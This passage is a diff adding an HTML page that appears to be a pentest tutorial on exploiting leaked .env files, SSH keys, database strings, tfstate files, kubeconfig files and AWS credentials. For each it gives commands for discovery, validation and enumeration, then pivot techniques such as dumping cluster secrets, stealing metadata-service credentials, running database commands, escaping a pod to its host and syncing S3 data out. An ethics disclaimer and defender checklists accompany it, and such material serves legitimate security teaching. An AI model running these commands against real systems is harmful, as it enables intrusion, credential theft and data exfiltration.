@@ -1,0 +1,1157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Red Team Walkthrough — Turning Leaks Into Loot ☕</title>
+<link rel="stylesheet" href="../../../assets/styles.css" />
+<style>
+  /* Per-page: tab switcher for leak types */
+  .leak-tabs { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 24px; padding-bottom: 14px; border-bottom: 1px dashed var(--ink-mute); }
+  .leak-tab { padding: 8px 14px; font-family: var(--mono); font-size: 12px; cursor: pointer; border: 1px solid var(--ink-mute); border-radius: 6px; background: transparent; color: var(--ink-dim); transition: all .15s; user-select: none; }
+  .leak-tab:hover { color: var(--ink); border-color: var(--accent); }
+  .leak-tab.active { background: var(--accent); color: #000; border-color: var(--accent); font-weight: 700; }
+  .leak-panel { display: none; }
+  .leak-panel.active { display: block; animation: fadeIn .2s; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+
+  .kill-chain { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 6px; margin: 18px 0; }
+  .kill-step { padding: 10px; background: rgba(255,255,255,0.03); border: 1px solid var(--ink-mute); border-left: 3px solid var(--accent-2); border-radius: 4px; font-size: 12px; }
+  .kill-step .num { font-family: var(--mono); color: var(--accent); font-size: 10px; letter-spacing: 1px; display: block; margin-bottom: 4px; }
+  .cvss-badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-family: var(--mono); font-size: 10px; font-weight: 700; margin-left: 8px; letter-spacing: 0.5px; }
+  .cvss-badge.critical { background: #ff2d5f; color: #fff; }
+  .cvss-badge.high { background: #ff7a2d; color: #000; }
+  .cvss-badge.medium { background: #ffc12d; color: #000; }
+  .effort-meter { display: inline-flex; gap: 3px; align-items: center; margin-left: 12px; font-family: var(--mono); font-size: 11px; color: var(--ink-dim); }
+  .effort-meter .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--ink-mute); }
+  .effort-meter .dot.on { background: var(--accent-2); }
+</style>
+</head>
+<body data-page-slug="leaky-commits-red-team">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../../../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../../../index.html">Home</a>
+    <a href="../../../index.html#topics-web" class="active">Topics</a>
+    <a href="../../../glossary/index.html">Glossary</a>
+    <a href="../../../tryhackme/index.html">THM</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../../../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="../../../index.html#topics-web">Topics</a>
+  <span class="sep">›</span>
+  <a href="index.html">Leaky Commits</a>
+  <span class="sep">›</span>
+  <span>Red Team Walkthrough</span>
+</div>
+
+<!-- HERO -->
+<section class="hero" id="hero">
+  <div class="hero-content">
+    <span class="coffee-badge">☕ red team · offensive · hands-on</span>
+    <h1>🎯 Red Team Walkthrough</h1>
+    <p class="subtitle">You found a leak. Now what?<br>Each tab below = one leak type. What an attacker does with it, step by step. Real commands. Real tools. Real kill chains.</p>
+    <div class="tagline">"Finding loot is junior work. Knowing what to DO with it = senior."</div>
+    <br>
+    <p style="font-size: 13px; color: var(--ink-dim); max-width: 680px; margin: 10px auto 0;">
+      ⚠️ <strong>Ethics lane:</strong> everything below assumes you have <span class="term" data-term="bug-bounty">bug bounty</span> scope or explicit written pentest authorization. Running these against a system you don't own = PECA 2016 § 3 / CFAA / unauthorized access = jail. Practice in your own lab or on approved targets.
+    </p>
+  </div>
+</section>
+
+<!-- CHAPTER: THE KILL-CHAIN MODEL -->
+<section class="chapter" id="model">
+  <div class="chapter-num">Chapter 00 // The shared model</div>
+  <h2><span class="emoji">🧠</span> Every leak follows the same 5-step kill chain</h2>
+  <p class="lead">Different leak types, same pattern. Learn this once, apply it everywhere.</p>
+
+  <div class="kill-chain">
+    <div class="kill-step"><span class="num">STEP 01</span><strong>Discover</strong><br>You find the file. GitHub, Shodan, S3 indexing.</div>
+    <div class="kill-step"><span class="num">STEP 02</span><strong>Validate</strong><br>Does it still work? Is the creds live? (Passive check, no noise.)</div>
+    <div class="kill-step"><span class="num">STEP 03</span><strong>Enumerate</strong><br>What does this grant? Permissions, scope, blast radius.</div>
+    <div class="kill-step"><span class="num">STEP 04</span><strong>Pivot</strong><br>Can you chain to something bigger? More creds, more access.</div>
+    <div class="kill-step"><span class="num">STEP 05</span><strong>Loot / Report</strong><br>Attacker: exfil + persist. You (ethical): document + responsible disclosure.</div>
+  </div>
+
+  <div class="paper">
+    <h4>📝 Why the validation step matters MOST</h4>
+    <p>90% of "leaks" you find are <strong>already expired</strong>, rotated, or were test creds to begin with. The validation step separates real findings from noise.</p>
+    <p>And here's the trick: the validation request should be <span class="highlight">as boring as possible</span> — a simple "who am I?" API call. Never a data-exfil call. Reason: if you're on a bug bounty program, a read-only identity check is always in scope. A dump-all-users query is <strong>not</strong>, even if the creds work.</p>
+  </div>
+</section>
+
+<div class="divider">pick your poison</div>
+
+<!-- ============== TABS ============== -->
+<section class="chapter" id="leaks">
+  <div class="chapter-num">Chapter 01 // Each leak, one chapter</div>
+  <h2><span class="emoji">🗂️</span> Pick a leak type</h2>
+  <p class="lead">Click a tab. Each panel is a complete red-team walkthrough for that specific file type.</p>
+
+  <div class="leak-tabs" id="leakTabs">
+    <div class="leak-tab active" data-panel="env">📄 .env</div>
+    <div class="leak-tab" data-panel="sshkey">🗝️ SSH private key</div>
+    <div class="leak-tab" data-panel="dburi">🗄️ DB connection string</div>
+    <div class="leak-tab" data-panel="tfstate">🗺️ terraform.tfstate</div>
+    <div class="leak-tab" data-panel="kubeconfig">☸️ kubeconfig</div>
+    <div class="leak-tab" data-panel="awscreds">☁️ AWS credentials file</div>
+    <div class="leak-tab" data-panel="gcp">🌩️ GCP service account JSON</div>
+    <div class="leak-tab" data-panel="schema">🧬 schema.sql</div>
+    <div class="leak-tab" data-panel="bashhist">📜 .bash_history</div>
+    <div class="leak-tab" data-panel="commitmsg">💬 commit messages</div>
+    <div class="leak-tab" data-panel="gitfolder">📂 exposed .git folder</div>
+    <div class="leak-tab" data-panel="djangokey">🐍 Django SECRET_KEY</div>
+    <div class="leak-tab" data-panel="jwt">🎟️ JWTs in tests</div>
+    <div class="leak-tab" data-panel="postman">📫 Postman collection</div>
+    <div class="leak-tab" data-panel="keystore">📱 Android keystore</div>
+  </div>
+
+  <!-- ================== PANEL: .env ================== -->
+  <div class="leak-panel active" id="panel-env">
+    <h3>📄 .env file <span class="cvss-badge critical">CVSS 9.8</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">The dream find. One file, many credentials, each independently valuable.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+<span class="com"># GitHub code search — the workhorse queries</span>
+filename:.env DB_PASSWORD
+filename:.env STRIPE
+filename:.env AWS_SECRET_ACCESS_KEY
+filename:.env "SENDGRID_API_KEY"
+"<span class="str">target-company.com</span>" filename:.env    <span class="com"># target-scoped</span>
+
+<span class="com"># Github via gh CLI (bypasses web UI 1000-result cap per query)</span>
+gh search code 'filename:.env target-company' --limit 100 --json repository,path
+
+<span class="com"># grep.app — indexes 500k+ repos, catches deleted commits</span>
+https://grep.app/search?q=SENDGRID_API_KEY&filter[repo][0]=target-company
+    </div>
+
+    <h4>✅ Step 2 — Validate (per credential, lightest possible)</h4>
+    <div class="code safe">
+<span class="com"># AWS — simplest whoami call</span>
+aws sts get-caller-identity
+<span class="com"># Returns: {"UserId":"...","Account":"123456789012","Arn":"arn:aws:iam::..."}</span>
+
+<span class="com"># Stripe — account lookup, doesn't move money</span>
+curl https://api.stripe.com/v1/account -u sk_live_abc123:
+
+<span class="com"># SendGrid — profile read</span>
+curl -H "Authorization: Bearer SG.xxxx" https://api.sendgrid.com/v3/user/profile
+
+<span class="com"># Database — just TCP connect, no query</span>
+nc -zv prod-db.internal 5432  <span class="com"># TCP only, no auth attempt</span>
+<span class="com"># Then: psql "postgres://admin:pw@prod-db:5432/users" -c "SELECT 1;"</span>
+    </div>
+
+    <h4>🗺️ Step 3 — Enumerate blast radius</h4>
+    <div class="grid cols-2">
+      <div class="card">
+        <h4>🔎 AWS IAM scope</h4>
+        <div class="code" style="margin: 8px 0; font-size: 11px;">aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query UserId --output text)
+aws iam get-account-summary
+aws iam list-access-keys</div>
+      </div>
+      <div class="card">
+        <h4>💳 Stripe scope</h4>
+        <div class="code" style="margin: 8px 0; font-size: 11px;">curl -u sk_live_abc123: https://api.stripe.com/v1/charges?limit=1
+<span class="com"># Key types: rk_live_ (restricted) vs sk_live_ (full)</span></div>
+      </div>
+      <div class="card">
+        <h4>📧 SendGrid scope</h4>
+        <div class="code" style="margin: 8px 0; font-size: 11px;">curl -H "Authorization: Bearer SG.xxxx" https://api.sendgrid.com/v3/scopes
+<span class="com"># full-access scope = can send mail FROM any verified sender</span></div>
+      </div>
+      <div class="card">
+        <h4>🐘 DB scope</h4>
+        <div class="code" style="margin: 8px 0; font-size: 11px;"><span class="com"># List databases, current user privileges</span>
+psql ... -c "\l"
+psql ... -c "SELECT current_user, session_user;"
+psql ... -c "\du"</div>
+      </div>
+    </div>
+
+    <h4>🔗 Step 4 — Pivot chains (.env is a pivot goldmine)</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>DB → user PII</strong><br>Dump users table → emails + hashes → crack weak hashes → try credential stuffing against other services</div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>AWS → S3 backups</strong><br><code>aws s3 ls</code> → find <code>backups-prod</code> → download nightly DB dumps → offline analysis</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>SMTP → phishing</strong><br>Use leaked SMTP creds to send phishing FROM legit company mail server → bypasses SPF/DKIM/DMARC → 10x click-through</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Django SECRET_KEY → session forge</strong><br>Sign a cookie for <code>user_id=1</code> (usually admin) → log in as anyone</div>
+    </div>
+
+    <h4>🛡️ Step 5 — Defender view (what to check / fix)</h4>
+    <ul>
+      <li>Search your own repos: <code class="inline">gh search code filename:.env org:yourorg</code></li>
+      <li>Enable <strong>GitHub Secret Scanning + Push Protection</strong> on every repo (free since 2024 for public repos, paid for private but worth it)</li>
+      <li>Install <code class="inline">trufflehog</code> in CI: <code class="inline">trufflehog git file://. --only-verified</code></li>
+      <li>Rotate anything found, rewrite history with <code class="inline">git filter-repo</code>, force push</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: SSH KEY ================== -->
+  <div class="leak-panel" id="panel-sshkey">
+    <h3>🗝️ SSH private key <span class="cvss-badge critical">CVSS 9.1</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">A file that says <code>-----BEGIN OPENSSH PRIVATE KEY-----</code>. Usually <code>id_rsa</code>, <code>id_ed25519</code>, <code>deploy_key</code>, or a <code>.pem</code>.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+<span class="com"># GitHub queries</span>
+"BEGIN OPENSSH PRIVATE KEY"
+"BEGIN RSA PRIVATE KEY"
+filename:id_rsa -filename:id_rsa.pub
+filename:deploy_key
+extension:pem private
+
+<span class="com"># Target-scoped — find their dev's personal accidental commit</span>
+"target-company" "BEGIN OPENSSH"
+    </div>
+
+    <h4>✅ Step 2 — Validate</h4>
+    <div class="code safe">
+<span class="com"># Extract the public key from the private (never modify the private)</span>
+ssh-keygen -y -f stolen_key &gt; stolen_key.pub
+
+<span class="com"># Hash the public key — lets you compare against Shodan's database</span>
+ssh-keygen -lf stolen_key.pub
+<span class="com"># Output: 256 SHA256:abc123... user@host (ED25519)</span>
+
+<span class="com"># Check if known compromised</span>
+<span class="com"># github.com/rapid7/ssh-badkeys → database of publicly-known-exposed keys</span>
+
+<span class="com"># Try a single connection (only to targets you have permission for!)</span>
+ssh -i stolen_key -o StrictHostKeyChecking=no -o PasswordAuthentication=no \
+    -o PubkeyAcceptedKeyTypes=+ssh-rsa user@target.example.com
+    </div>
+
+    <h4>🗺️ Step 3 — Enumerate</h4>
+    <p>SSH keys don't "list permissions" — you need to infer from context:</p>
+    <div class="code">
+<span class="com"># Look near the key for a config file that says where it works</span>
+cat ~/.ssh/config
+cat known_hosts            <span class="com"># sometimes committed, lists server fingerprints</span>
+cat authorized_keys        <span class="com"># reveals which keys are allowed to log in</span>
+
+<span class="com"># Once you have shell, enumerate the host quickly</span>
+whoami; id; hostname
+cat /etc/passwd | grep -v nologin | grep -v false
+sudo -ln                   <span class="com"># what can I sudo without password?</span>
+ls -la /root/ 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null  <span class="com"># SUID binaries for privesc</span>
+    </div>
+
+    <h4>🔗 Step 4 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Dev laptop → other servers</strong><br><code>~/.ssh/known_hosts</code> lists every host the dev ever SSH'd to → try the same key there</div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Shell → find more keys</strong><br>On the server: <code>find / -name "id_*" 2>/dev/null</code> → pick up deploy keys, service keys</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>Shell → cloud metadata</strong><br><code>curl http://169.254.169.254/latest/meta-data/</code> → AWS IMDS → steal EC2 role creds</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Shell → CI/CD access</strong><br>Read <code>~/.jenkins/</code>, <code>~/.github/</code>, <code>~/.gitlab/</code> → GitHub tokens, deploy keys, Jenkins API keys</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Never allow RSA keys without passphrase on dev machines — <code>ssh-keygen -p -f ~/.ssh/id_rsa</code></li>
+      <li>Prefer short-lived SSH certs (Vault SSH, Teleport, Smallstep <code>step-ssh</code>) over static keys</li>
+      <li><code>sshd_config</code>: <code>PasswordAuthentication no</code>, <code>PermitRootLogin no</code>, restrict <code>AllowUsers</code></li>
+      <li>Log <code>authorized_keys</code> changes — unexpected additions = breach signal</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: DB CONNECTION STRING ================== -->
+  <div class="leak-panel" id="panel-dburi">
+    <h3>🗄️ Database connection string <span class="cvss-badge critical">CVSS 9.0</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">A URI with host + username + password baked in. The format varies by DB but the attack is the same: connect, dump, done.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+"mongodb+srv://" password
+"jdbc:postgresql://" password
+"jdbc:mysql://" password
+"redis://" password
+"mysql+pymysql://"
+
+<span class="com"># Python/Django style</span>
+DATABASE_URL= target-company
+
+<span class="com"># Rails style</span>
+filename:database.yml password
+
+<span class="com"># .NET style</span>
+filename:web.config connectionString
+    </div>
+
+    <h4>✅ Step 2 — Validate (the three-tier test)</h4>
+    <div class="code safe">
+<span class="com"># Tier 1: TCP reachable? (no auth attempt yet)</span>
+nc -zv <span class="str">prod-db.company.com</span> 5432
+<span class="com"># Connection succeeded = firewall lets you in = you're on a public IP or VPN works</span>
+
+<span class="com"># Tier 2: Does the creds authenticate?</span>
+<span class="com"># Postgres</span>
+PGPASSWORD=pw psql -h prod-db.company.com -U admin -d postgres -c "SELECT 1;"
+<span class="com"># MySQL</span>
+mysql -h prod-db.company.com -u admin -ppw -e "SELECT 1;"
+<span class="com"># MongoDB</span>
+mongosh "mongodb+srv://admin:pw@cluster0.mongodb.net/" --eval "db.runCommand({ping:1})"
+<span class="com"># Redis</span>
+redis-cli -h prod-redis.company.com -p 6379 -a pw PING
+
+<span class="com"># Tier 3: Your user has READ permission? (still no data exfil)</span>
+psql ... -c "\dt"       <span class="com"># Postgres: list tables, doesn't read content</span>
+mysql ... -e "SHOW DATABASES;"
+mongosh ... --eval "db.adminCommand({listDatabases:1})"
+    </div>
+
+    <h4>🗺️ Step 3 — Enumerate</h4>
+    <div class="code">
+<span class="com"># PostgreSQL — privilege check</span>
+SELECT current_user, session_user;
+SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user;
+SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;
+
+<span class="com"># MySQL</span>
+SHOW GRANTS FOR CURRENT_USER();
+SELECT User, Host, Super_priv, File_priv FROM mysql.user;
+
+<span class="com"># Schema recon (what tables exist, no data read)</span>
+SELECT table_schema, table_name FROM information_schema.tables
+  WHERE table_schema NOT IN ('information_schema','pg_catalog','mysql','performance_schema','sys');
+
+<span class="com"># Size of targets — pick dumps by value</span>
+SELECT table_schema, table_name,
+       pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename))
+FROM pg_tables ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC LIMIT 20;
+    </div>
+
+    <h4>🔗 Step 4 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>If user is <code>SUPERUSER</code> → OS command exec</strong><br>Postgres: <code>COPY ... FROM PROGRAM 'cmd'</code>. MySQL: <code>SELECT ... INTO OUTFILE</code> to <code>/var/www/html/shell.php</code></div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>UDF / extension abuse</strong><br>Postgres: <code>CREATE EXTENSION dblink</code> → SSRF the internal network from within the DB</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>Session token forgery</strong><br>Dump <code>users.session_key</code> or <code>users.api_token</code> → impersonate users in the app layer</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Cloud metadata</strong><br>If DB runs on EC2 and you got RCE via PIVOT A → IMDS → role creds → lateral cloud movement</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Never expose DBs to the internet. Firewall rule: only allow from bastion/VPN/app subnet</li>
+      <li>Use IAM-authenticated DB access (AWS RDS IAM auth, Azure AAD auth) — no password to leak</li>
+      <li>Least-privilege DB users per service; no shared "admin" account</li>
+      <li>Log all queries to an append-only log (CloudTrail for RDS, <code>pgaudit</code>, MySQL <code>general_log</code>)</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: TFSTATE ================== -->
+  <div class="leak-panel" id="panel-tfstate">
+    <h3>🗺️ terraform.tfstate <span class="cvss-badge high">CVSS 7.5 (9.0 if outputs have secrets)</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">Not directly exploitable — but it's a <em>map</em>. Turns blind attackers into surgical ones.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+filename:terraform.tfstate
+filename:terraform.tfstate.backup
+filename:*.tfstate
+filename:*.tfvars password    <span class="com"># sometimes has plaintext</span>
+
+<span class="com"># S3-hosted state files with public-read misconfig</span>
+"terraform.tfstate" site:*.s3.amazonaws.com
+
+<span class="com"># Target-scoped</span>
+"target-company" filename:terraform.tfstate
+    </div>
+
+    <h4>✅ Step 2 — Validate it's current</h4>
+    <div class="code safe">
+<span class="com"># Check when the file was last pushed</span>
+git log --all --full-history -- "*.tfstate" | head -20
+
+<span class="com"># Check the serial number (Terraform increments it per apply)</span>
+jq '.serial, .lineage, .terraform_version' terraform.tfstate
+
+<span class="com"># Validate one resource exists — cheapest possible DNS query</span>
+jq -r '.resources[] | select(.type=="aws_db_instance") | .instances[].attributes.endpoint' terraform.tfstate
+<span class="com"># → "prod-db.xyz.us-east-1.rds.amazonaws.com:5432"</span>
+dig +short prod-db.xyz.us-east-1.rds.amazonaws.com
+<span class="com"># If it resolves → infrastructure still exists → tfstate is probably current</span>
+    </div>
+
+    <h4>🗺️ Step 3 — Enumerate (the gold extraction)</h4>
+    <div class="code">
+<span class="com"># Extract every resource type and count</span>
+jq -r '.resources[] | .type' terraform.tfstate | sort | uniq -c | sort -rn
+
+<span class="com"># Hunt plaintext secrets in outputs</span>
+jq '.outputs' terraform.tfstate
+jq '.. | objects | select(has("master_password"))' terraform.tfstate
+jq '.. | strings | select(test("(password|secret|token|key)"; "i"))' terraform.tfstate
+
+<span class="com"># Extract every S3 bucket name (list them, don't touch)</span>
+jq -r '.resources[] | select(.type=="aws_s3_bucket") | .instances[].attributes.bucket' terraform.tfstate
+
+<span class="com"># Extract RDS endpoints</span>
+jq -r '.resources[] | select(.type=="aws_db_instance") | .instances[].attributes | .endpoint' terraform.tfstate
+
+<span class="com"># EC2 IPs + SG associations</span>
+jq -r '.resources[] | select(.type=="aws_instance") | .instances[].attributes | [.id, .public_ip, .private_ip] | @tsv' terraform.tfstate
+
+<span class="com"># IAM policies (what over-privileged role can I target?)</span>
+jq '.resources[] | select(.type=="aws_iam_policy") | .instances[].attributes.policy' terraform.tfstate
+    </div>
+
+    <h4>🔗 Step 4 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Bucket names → public-read check</strong><br><code>aws s3 ls s3://leaked-bucket-name --no-sign-request</code></div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>RDS endpoint + tfstate creds</strong><br>If outputs have DB password → direct connect (see DB pivot panel)</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>IAM role ARN → assume-role abuse</strong><br>If you already have ANY AWS credential → <code>aws sts assume-role --role-arn ...</code> to test</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Internal hostnames → subdomain takeover hunt</strong><br>tfstate lists every <code>aws_route53_record</code> → check for dangling records pointing to decommissioned resources</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Remote backend with encryption: S3 + KMS + DynamoDB locking, OR Terraform Cloud</li>
+      <li>Mark outputs <code>sensitive = true</code> — doesn't encrypt in state but blocks CLI display</li>
+      <li>Never put raw secrets in variables — fetch from Vault/SecretsManager at plan time</li>
+      <li><code>.gitignore</code> <code>*.tfstate*</code>, <code>*.tfvars</code>, <code>.terraform/</code> from day one</li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: KUBECONFIG ================== -->
+  <div class="leak-panel" id="panel-kubeconfig">
+    <h3>☸️ kubeconfig <span class="cvss-badge critical">CVSS 9.9</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">If RBAC gives this user <code>cluster-admin</code> (it usually does on dev machines) — it's game over for every workload.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+filename:kubeconfig
+filename:.kube/config
+"current-context:" "certificate-authority-data"
+"kind: Config" apiVersion
+
+<span class="com"># Public S3 / Azure Blob / GCS</span>
+"kubeconfig" site:*.s3.amazonaws.com
+    </div>
+
+    <h4>✅ Step 2 — Validate</h4>
+    <div class="code safe">
+<span class="com"># Can you even reach the API server?</span>
+SERVER=$(yq '.clusters[0].cluster.server' stolen-kubeconfig)
+curl -k -o /dev/null -w "%{http_code}\n" $SERVER/healthz
+<span class="com"># 200 = reachable. 403 = reachable but token rejected. Timeout = private endpoint, need VPN/SSRF</span>
+
+<span class="com"># Lightest identity call</span>
+kubectl --kubeconfig=stolen-kubeconfig auth whoami
+<span class="com"># or older: kubectl --kubeconfig=stolen-kubeconfig get --raw=/api/v1/namespaces</span>
+
+<span class="com"># What CAN this user do? (no actual ops)</span>
+kubectl --kubeconfig=stolen-kubeconfig auth can-i --list
+kubectl --kubeconfig=stolen-kubeconfig auth can-i '*' '*'   <span class="com"># cluster-admin?</span>
+    </div>
+
+    <h4>🗺️ Step 3 — Enumerate (the cluster walk)</h4>
+    <div class="code">
+<span class="com"># Namespaces = rough org structure</span>
+kubectl get ns
+
+<span class="com"># Every secret in every namespace — the motherlode</span>
+kubectl get secrets -A -o yaml &gt; all-secrets.yaml
+grep -E "(password|token|key)" all-secrets.yaml
+
+<span class="com"># ServiceAccount tokens — portable credentials</span>
+kubectl get sa -A
+kubectl get sa -n kube-system -o yaml | grep -A 2 token
+
+<span class="com"># What's running? Images, env vars (often has creds)</span>
+kubectl get pods -A -o json | jq '.items[] | {ns:.metadata.namespace, name:.metadata.name, image:.spec.containers[].image, env:.spec.containers[].env}'
+
+<span class="com"># ConfigMaps — often have less-secret-but-still-interesting config</span>
+kubectl get cm -A -o yaml | grep -iE "(endpoint|url|host)" | head
+
+<span class="com"># Ingress = external attack surface mapped for you</span>
+kubectl get ingress -A
+    </div>
+
+    <h4>🔗 Step 4 — Pivot (how attackers escape pods)</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>Exec into any pod → mini-shell on the cluster</strong><br><code>kubectl exec -it -n app my-pod -- /bin/sh</code></div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>Deploy privileged pod → escape to host node</strong><br>Apply a pod manifest with <code>privileged: true</code> + <code>hostPID: true</code> + <code>volumeMounts: [{mountPath: /host, hostPath: /}]</code> → chroot to host</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>Steal service-account tokens → move between clusters</strong><br>Every pod has <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. Some pods have cross-cluster creds (GitOps operators, ArgoCD)</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Cloud metadata from inside</strong><br>From escaped host: <code>curl http://169.254.169.254/</code> → EC2/GCE/Azure metadata → cloud role creds → full cloud takeover</div>
+    </div>
+
+    <h4>🛡️ Defender view</h4>
+    <ul>
+      <li>Use short-lived OIDC tokens (Dex, Okta, Azure AD) instead of static <code>token:</code> entries</li>
+      <li>Pod Security Admission set to <code>restricted</code>; NO privileged pods, NO hostPath mounts in prod namespaces</li>
+      <li>Network policy denying pod → IMDS (<code>169.254.169.254</code>) traffic</li>
+      <li>Audit log + SIEM alerts on <code>get secrets -A</code>, <code>exec</code>, <code>apply</code> of privileged specs</li>
+      <li>Namespace-scoped RBAC; NO developer ever has <code>cluster-admin</code></li>
+    </ul>
+  </div>
+
+  <!-- ================== PANEL: AWS CREDS FILE ================== -->
+  <div class="leak-panel" id="panel-awscreds">
+    <h3>☁️ AWS credentials file <span class="cvss-badge critical">CVSS 9.0</span> <span class="effort-meter">effort: <span class="dot on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></span></h3>
+    <p class="lead">The file at <code>~/.aws/credentials</code>. INI-format. Often committed when devs accidentally push their whole home folder.</p>
+
+    <h4>🔍 Step 1 — Discover</h4>
+    <div class="code">
+filename:credentials aws_access_key_id
+filename:.aws/credentials
+"aws_secret_access_key" extension:txt
+
+<span class="com"># Also hunt the "export" style in shell scripts</span>
+"export AWS_SECRET_ACCESS_KEY" extension:sh
+"AWS_ACCESS_KEY_ID=AKIA" filename:.env
+    </div>
+
+    <h4>✅ Step 2 — Validate</h4>
+    <div class="code safe">
+<span class="com"># Use a throwaway AWS profile so you don't taint your own creds</span>
+export AWS_ACCESS_KEY_ID=AKIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...  <span class="com"># only if temp creds</span>
+
+<span class="com"># The boring identity call</span>
+aws sts get-caller-identity
+<span class="com"># {"UserId": "AIDAI...", "Account": "123456789012", "Arn": "arn:aws:iam::123456789012:user/bob"}</span>
+
+<span class="com"># Key type gives you a hint of scope</span>
+<span class="com"># AKIA... = long-term IAM user key</span>
+<span class="com"># ASIA... = short-term session credential (pair with session token)</span>
+    </div>
+
+    <h4>🗺️ Step 3 — Enumerate (the standard AWS pentest walk)</h4>
+    <div class="code">
+<span class="com"># Two excellent tools — use them, don't reinvent</span>
+pacu           <span class="com"># Rhino Security Labs' AWS exploitation framework</span>
+enumerate-iam  <span class="com"># pure-IAM enumeration, very quiet</span>
+
+<span class="com"># Manual essentials</span>
+aws iam list-attached-user-policies --user-name bob
+aws iam list-user-policies --user-name bob
+aws iam simulate-principal-policy \
+    --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
+    --action-names s3:* ec2:* iam:* rds:* lambda:*
+
+<span class="com"># Regions enumeration (which regions have resources?)</span>
+for r in us-east-1 us-west-2 eu-west-1 ap-south-1; do
+    echo "=== $r ==="
+    aws s3 ls --region $r 2>&amp;1 | head -5
+    aws ec2 describe-instances --region $r --query 'Reservations[].Instances[].InstanceId' 2>&amp;1
+done
+    </div>
+
+    <h4>🔗 Step 4 — Pivot</h4>
+    <div class="kill-chain">
+      <div class="kill-step"><span class="num">PIVOT A</span><strong>S3 → data exfil</strong><br><code>aws s3 sync s3://bucket ./local/</code></div>
+      <div class="kill-step"><span class="num">PIVOT B</span><strong>IAM PassRole → privesc</strong><br>If you can <code>iam:PassRole</code> + run Lambda/EC2 → create a resource that assumes a higher-priv role</div>
+      <div class="kill-step"><span class="num">PIVOT C</span><strong>Secrets Manager / SSM → more creds</strong><br><code>aws secretsmanager list-secrets</code> → <code>get-secret-value</code> each one</div>
+      <div class="kill-step"><span class="num">PIVOT D</span><strong>Cross-account via trust policy</strong><br><code>aws iam get-role --role-name X</code> → inspect trust → <code>aws sts assume-role --role-arn arn:aws:iam::OTHER_ACCOUNT:role/Y</code></div>
+      <div class="kill-step"><span class="num">PIVOT E</span><strong>Cryptomining (real attackers)</strong><br>Attacker spins up max-size instances in every region. Victim sees $50K bill overnight.</div>
+    </div>
+
